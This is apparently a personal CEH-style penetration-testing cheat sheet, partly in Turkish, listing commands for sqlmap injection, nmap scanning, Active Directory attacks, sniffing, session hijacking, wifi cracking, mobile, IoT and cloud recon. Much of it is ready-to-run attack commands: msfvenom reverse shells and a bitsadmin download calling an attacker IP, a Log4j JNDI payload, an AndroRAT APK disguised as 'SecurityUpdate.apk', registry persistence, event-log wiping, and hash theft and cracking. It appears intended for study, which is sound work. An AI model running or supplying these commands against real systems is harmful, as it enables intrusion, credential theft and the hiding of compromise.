- [sqlmap cheatsheet](#sqlmap-cheatsheet)
- [Footprint](#footprint)
- [Scan Network Discovery](#scan-network-discovery)
- [ENUM](#enum)
- [Vuln Analysis And SYS](#vuln-analysis-and-sys)
- [Malware threats & Sniff](#malware-threats--sniff)
- [Social engineer](#social-engineer)
- [DDOS](#ddos)
- [Session hijac](#session-hijac)
- [EVAIDING IDS POTS](#evaiding-ids-pots)
- [Web Servers](#web-servers)
- [Web Applications](#web-applications)
- [wifi](#wifi)
- [mobile and ıot](#mobile-and-ıot)
- [Cloud Computing](#cloud-computing)
- [Crypto tool](#crypto-tool)
# sqlmap cheatsheet

### General command:

çerez belirtir “--cookie='xxx=xxx'”

veritabanı listeler “--dbs”  veritabanı seçer“-D databasename”

Tablo listeler “--tables”     tablo seçer “-T tablename” 

Veritabanının çıktılarını alır “--dump”

“--risk 3“ payloadların şiddetini agresifliini artırır 1 ile 3 arasıdır 

“--prefix **'`)' “** payloadlara ön ek ekler 

“--union-cols=5” kolon sayısnı belirt

“--schema” veritaban, tablo enum 

“--search -D testdb -T users -C ” -C kolon arama search komutu ile

Anti csrf(--csrf-token="”): --data-raw 'id=1&t0ken=zvJwUGWsXtEca9n9zeakELWbdXRAwWoUi71e5Pdqi9Y' --csrf-token="t0ken”  

“--randomize=uid” case9.php?id=1&uid=3523086808  random olan paramlar için

“--random-agent”  gerçek taryıcı agent ile istek atar

“--tamper=between,randomcase”  waf ıds ıps bypass

### POST İnject command

sqlmap 'http://ipadres/ss.php' --data 'uid=1&name=test'   

sqlmap -u "sitead/aaa.ext" **--batch**  “ sorulan sorulara evet der”

**cookie belirler:** --cookie= 'xxx=xxx'

metod belirleme: --method POST

### CUSTOM REQ

**cookie sql inject:** sqlmap 'http://adress/aa.ext' --cookie="id=1*”

“*” karakteri nereye denenmesi gerektiğini gösterir

**JSON İnject:** sqlmap [http://ipadres/](http://94.237.57.1:53128/case4.php)sss.ext --data-raw '{"id":1}'

### GET inject command

sqlmap http://ipadres/case5.php?id=1 --risk=3 --dbs





# Footprint

### GHDB

**site:** adress.org

**filetype:**pdf

**allintitle**: detect malware

**inanchor**:Norton

**allinanchor**: best cloud service provider

**location**: EC-Council

### DNS Enum footprint

[**dnsdumpster.com](http://dnsdumpster.com)** 

Windows **nslookup (aliases,adressname)**

**Command:** **nslookup** enter a bas >> **set type=a**  yazıcında ip adresi çıkar 

**set type=cname** yazınca cname bilgileri çıkar

**set type=ns** yazınca nameserverlar çıkar

### Traceroute

windows **tracert** google.com

linux **traceroute** -h 5 google.com “-h 5 atlama”

### EMAİL Footprint

email tracker pro  ile email header bilgisini tara trace header

### Recon-ng

modül yükleme marketplace install all
modules searc:  search modules
workspaces create, load, list
modules load brute
modules load recon/domains-hosts/brute_hosts
**domain add** = db insert domains 

### OSİNT

linux tool **sherlock "keyword"** ile sosyal medya aramaları yapmak

https://www.social-searcher.com/


# Scan Network Discovery

## Host Discovery and port disco

### Nmap Host discovery

**Arp scan**: nmap -sn -PR 192.168.0.0/24  “-sn disable port scan”

**UDP ping scan:** nmap -sn -PU 192.168.0.0/24 

**ICMP Ping scan:**  nmap -sn -PE 192.168.0.0/24 

**TCP SYN pin scan:** nmap -sn -PS 192.168.0.0/24 

**TCP ACK pin scan:** nmap -sn -PA 192.168.0.0/24 

**IP Protocol scan:** nmap -sn -PO 192.168.0.0/24 

### Nmap Port Service discovery

**Tcp Full scan**: nmap -sT -v 192.168.0.22  “-v view verbose”

**Stealth scan:** nmap -sS -v  192.168.0.22

**No ping scan:** nmap -Pn ip adress

**Agressive scan(-sC-sV include):** nmap -A ip adres

**OS detect scan:** nmap -O 192.168.0.22

**Script scan(recon scan):**  nmap -sC ipadres

**Detect version:** nmap -sV    192.168.0.22

**UDP Scan:**         nmap -sU  192.168.0.22

**XMASS Scan(port açıksa cevap dönmez kapalıysa rst ack):**   nmap -sX 192.168.0.22

### IDS/IPS Evasion nmap

**source port packet fragment:** nmap -g 80 -f  1092.168.1.1      “-g source port  -f packet ayırma”

Decoy scan:  nmap -D RND:10 [Target IP Address]                     “-D RND:10 10 tane rastegel ip ile tarama”

Decoy scan:  nmap -D 10.1.1.1,2.2.2.2 [Target IP Address]          “-D fake,fake,real targetl ip ile tarama”

Spoof mac scan: sudo nmap --spoof-mac 0   [Target IP Address]

### Nmap Script comamnd

**Smb enum(forest,domaın,fqdn,netbios):**  nmap --script smb-os-discovery  [ipadres]


# ENUM

### NETBIOS Enum

Windows NetBIOS enumator 

**Netbios isim liste:** nbtstat -a remote-ip 

host name obtain

netbios cache list: nbtstat -c 

shared folder view: net use

### SMB ENUM

nmap -p445 -A  ipadadres (smb message sign check)

**Smb enum(forest,domaın,fqdn,netbios):** nmap --script smb-os-discovery  ipadres

### SNMP ENUM

**snmpwalk command:**  snmpwalk -v1 -c public target-ip         “-v version  -c community str”

### LDAP ENUM

AdExplorer >> DC ip >> enter parola ister ise gir aynı alana dahil başak pc de istemez

CN-USERS >> USERNAME >>userprincaplename 

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

### NFS  ENUM

**SuperEnum tool:** superenum >> target.txt ile port tarama hazır nmap scriptlerini yürütür 

**NFS enum:** python3 rpc-scan.py [Target IP address] --rpc “--rpc list rpc ”

### DNS ENUM

dnsrecon.py -d aaa.co -a

full zone transfer: dig @[NameServer] [Target Domain] axfr       “ axfr full transfer”

dig sitead.co mx,ns,soa

responsible mail addr = dnsadmin.box5331.bl.com >> “.” change “@” dnsadmin@

windows: nslookup

set type=MX,NS, 
xxx.com
> 

axfr transfer== ls -d siteac[.com](http://certifiedhacker.com/)

### SMTP ENUM

**User enum:** nmap -p 25 --script=smtp-enum-users  ipaddres

**Open relay check:**  nmap -p 25 --script=smtp-open-relay [Target IP Address]

**SMTP Command check:**  nmap -p 25 --script=smtp-commands [Target IP Address]

### Global network inventory

detail info enum ip adres and pass user; snmp,netbios … etc



# Vuln Analysis And SYS

### CWE

Zayıflık sınıflamları kök nedeni 

[**cwe.mitre.org](http://cwe.mitre.org)** 

Smb with weakness vuln weakness ID  vb.

**CWE-591: Sensitive data** 

2023 CWE Top 25 Most Dangerous Software Weaknesses

### Vuln assessment

Vuln using OpenVAS

**Start openvas:** sudo docker run -d -p 443:443 --name openvas mikesplain/openvas 

Menu click >>scans>> tasks>> task wizard

Enter the severity level of DCE RPC

## System Hacking

### Attack to crack system use responder

NBT-NS,LLMNR can be used to extract hash pass.

Listen nbt and llmnr request. Send server legimate claiming meşru sunucu olduunu.

Responder is a llmnr nbt protocols posinoing using

Responder with obtained infomation: Target os info,client version,NTLM hash,target ip

**responder with hash elde etmek:**

**attacker: sudo responder -I eth0** 
**Target:** \\sunucu ip 
**Attacker:** user::ntlm hash

user::hash >> hash.txt >> john hash.txt>> pass crack

**Remote system using Revshell gen:**  **docker run -d -p 80:80 reverse_shell_generator**

**Command listening:** msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.250.1.6; set lport 8888; exploit”

**Create payload :** msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.250.1.6 LPORT=8888 -f exe -o reverse.exe

 

### **PRIV ESC**

msfconsole >> **search bypassuac** >>  **use exploit/windows/local/bypassuac_fodhelper >> set session id**

### Persistence

Persistence by modify Registry run keys 

**command:** reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\file-name.exe

### Clear logs to Hide evidence  of comprimise

**Windows clear log**

clear log bat event view: **\Clear_Event_Viewer_Logs.bat**.

**command log enum:** wevtutil el “el” params list enum logs name
**Command clear log:** wevtutil cl SYTEM … VB “cl” param clear log 
**Command wipe:** cipher /w:C  cipher  command to overwrite deleted files or folder. “/w: Folder path”

**Linux clear log**

**~/.bash_history in clear command:** history -c

shred ~/.bash_history  dosyayı güvenli silme  üzerine yazarak

## Active directory attack

Command nmap scan:  nmap 12.10.1.0/24

**target domain**: 12.10.1.23 open services: ldap,kerberos-sec …

**Enum AD service:** nmap -A -sC -sV 12.10.1.23 >> domain and forest name

**DC ASREP Attack**

DC server User disabled Pre auth detection and attack (**DONT_REQUIRE_PREAUTH** ) detect

**Asrep attack tools**: sudo su >> root home >> impacket>>examples >> python3 [GetNPUsers.py](http://getnpusers.py/) site.[com/](http://ceh.com/) -no-pass -usersfile /root/ADtools/users.txt -dc-ip **10.10.1.22 >> pre auth** disabled user NTLM hash obtain >> john --wordlist=/root/ADtools/rockyou.txt hash.txt

**ASREP hashcat crack:** hashcat -m 18200 -a 0 hashes_asrep.txt /root/ADtools/rockyou.txt  “--show parola göster”

### Password spray crack Crackmapexec

**Command cme crack** : cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "pass" 

### Post enum Powerview

**powershell -EP Bypass** exec disabled
target machine in poweview.ps1 download >>  Import-Module .\PowerView.ps1 >> 

**Powerview command: Get-NetGroup,** **Get-NetUser,Get-NetComputer,Invoke-ShareFinder**

### MSSQL Attack

nmap ip scan ouput sql server detect 

**mssql attack command:** hydra -L user.txt -P /root/ADtools/rockyou.txt İpadres mssql

**found password** “pass”>> python3 /root/impacket/examples/mssqlclient.py DC.com/SQL_rv:pass@10.10.1.30 -port 1433  -windows-auth >>” SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';  “
**sql serverda meterprter shell için:** msf console use exploit/windows/mssql/mssql_payload 
kullanıcı ad parola bilgisini ve veritabanı ismini master gir sonra exploit komutu ile çalıştır.

### Priv esc

winpeas download target pc  >> C:\Program Files\Services that is unquoted and can be exploited for >> msfvenom file exe

### Kerberoasting Attack

**Command rubues kerber attack**: rubeus.exe kerberoast /outfile:hash.txt

**obtain hash crack:** hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt

### FTP BRUTE

hydra -l username -P pass.txt ftp://ipadres


# Malware threats & Sniff

**Static analysis tools**

DIE,IDA(subroutine function ),Hybrid analysis

**Dynamic analysis**

TCPView,cports.exe,Procmon

## SNİFFER

**mac flood command: macof -i eth0 -n 10 -d ip adres**

**DHCP STARVATİON attack:** sudo yersinia -I >> f2 and X and 1  key >> (wirehark capture dhcp )

ARP POSİONİNG >> Cain abel

**Sniff detect:**  nmap --script=sniffer-detect [Target IP Address/ IP Address Range]


# Social engineer

SET Tool kit>> socail attack >> web site attack>>site cloner

netcraft


# DDOS

### Attack

TCP UDP.. ATTACK

Tools: ISB,UltraDDOS

BOTNET

eagle-dos.py bot upload attack

### DDOS DETECT

**Anti_DDoS_Guardian_setup.exe. >> block ip**


# Session hijac

### **Caido with sessions hijack**

attacker machine >> exec caido >> all listening traffic 8080 port

Target macihne >> attacker ip:8080/ca.crt download cert and install firefox browser proxy attacker ip and 8080 >> siteadres.com sessison hijacj

HETTY WİTH Session hijack

attacker >> hetty exec>> listening port ip >> target chrome proxy attackerip 8080 

**Session hijack network Bettercap**

attacker command: sudo **bettercap -iface eth0 >> net.probe on >> net.recon on >> net.sniff on**



# EVAIDING IDS POTS

### IDS Install and conf

snort install >> snort.exe exec >> show eth faces (snort -W) >> select eth faces (**snort -dev -i 2** ) 

### HONEYPOT COWRIE SSH Conf

**sudo adduser --disabled-password cowrie**

22 redirect 2222” **iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222”**

**22 port non root listening: “touch /etc/authbind/byport/22” >> “chown cowrie:cowrie /etc/authbind/byport/22” >> “** **chmod 770 /etc/authbind/byport/22”**

virtual env conf: “ **virtualenv --python=python3 cowrie-env” >> “source cowrie-env/local/bin/activate” >> bin/cowrie start** 

### EVADE Firewall with BITSADMIN

**Create backdoor:** “msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe”

**Evade firewall command:** bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe



#  Web Servers

### Footprint web server

**nc -vv www.xxx.com 80 >> “GET / HTTP/1.0”** 

telnet www.xxx.com 80 **>> “GET / HTTP/1.0”** 

### ENUM WEB Server info using nmap

**Web server enum dirctory info:** nmap -sV --script=http-enum  siteadres.com

**Web server host and user enum:** nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- siteadres.com

**Cross-Site Tracing (XST) vuln echo request:** nmap --script http-trace -d siteadres.com

**Waf detect:** nmap -p80 --script http-waf-detect sitead.co

### WebServer Attack

**FTP attack:**   hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[Windows 11'in IP Adresi] 

**Log4j Vulnerability**

**nmap scanning target ip result:** apache coyote 

**Listening:** nc -lvp 9001 

**python3 poc.py --userip my self ip --webport 8000 --lport 9001**

target apache coyote login page >> user name field payload “;{jndi:ldap://10.10.1.13:1389/a}”
pwned


#  Web Applications

### Web app recon

**banner grab: nc -vv www.xxx.com 80 >> “GET / HTTP/1.0”** 

telnet www.xxx.com 80 **>> “GET / HTTP/1.0”** 

**command**: nmap -T4 -A -v [Target Web Application] (dns host name)

Web app vuln SmartScanner  windows app 

 **N-Stalker, Uniscan,AppSpider**

**BURP  with login page brute force** >> intruder pass user field >> attack type cluster bomb payload 1,2 user pass list load >>start attack

Wordpress scan and attack >>  **wpscan --url** **http://ipadres:8080/ --api-token wpscantoken**



# wifi

a2= wpa

**AİRCRACK-NG:** aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '01.cap'


# mobile and ıot

sudo python3 phonesploitpro.py >> select 1 >> connect android ip adres

**payload create:** python3 androRAT.py --build -i ipadress -p 4444 -o SecurityUpdate.apk

**listening code:** python3 androRAT.py --shell -i 0.0.0.0 -p 4444

**apk yolu tespit:** adb shell pm path com.whatsapp

**dosya indr**: adb pull tam dizin 

## IOT

Mqtt port: 1883

machine1: mqtt router install 1883 port listening

machine2: iotsımulator install >> add new network >> machine1 ip adress >> add new device >> start network

Wireshark capture mqtt protocol message

### Controller Area Network create

sudo modprobe can
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

icsim run >> **./icsim vcan0** 

can conrtoller >> **./controls vcan0** 

**can sniff tool:  cansniffer -c vcan0**

**dump al: candump -l vcan0**

play tool: **canplayer -I candump-2024-05-07_063502.log**


# Cloud Computing

### AADInternals use and install

**install command:** 

powershell adminis >> Install-Module AADInternals >> Question Y >> Yes to All

**import command:**  Import-Module AADInternals

**Tenant Info Gather(DNS   MX  SPF DMARC DKIM)**

Invoke-AADIntReconAsOutsider -DomainName company.com | Format-table

**User enum command**

Invoke-AADIntUserEnumerationAsOutsider -UserName [info@](mailto:info@eccouncil.org)compoa.com >> result exist true

**users.txt enum :** Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal

**Azure AD login info command
obtain info( has pass, account tenant,locale,instance..)**

Get-AADIntLoginInformation -Domain xxx.co

Get-AADIntLoginInformation -Domain [user@company.co](mailto:user@company.co) (obtain info: Account Type,exists,tenant,user state..)

**Tenant ıd command**: Get-AADIntTenantID -Domain company.com

**Tenant registers domains get:**  Get-AADIntTenantDomains -Domain company.com

### AWS S3

**aws command will list all user policies:**
aws iam list-user-policies

**Role Policies:** aws iam list-role-policies

**Group policies:** aws iam list-group-policies

**Create user:** aws iam create-user

### Vulnerability Assessment on Docker Images using Trivy

trivy tool: container güvenliğni taraması yapar

**trivy image ubuntu**



# Crypto tool

**CryptoForge(blowfish, 3des,gost,aes) Text** use text file encrypted >> file extension “.cfe” uzantısına sahip

windows crypTool aracı ile kripto analiz yapılıyor

https://vii5ard.github.io/whitespace/
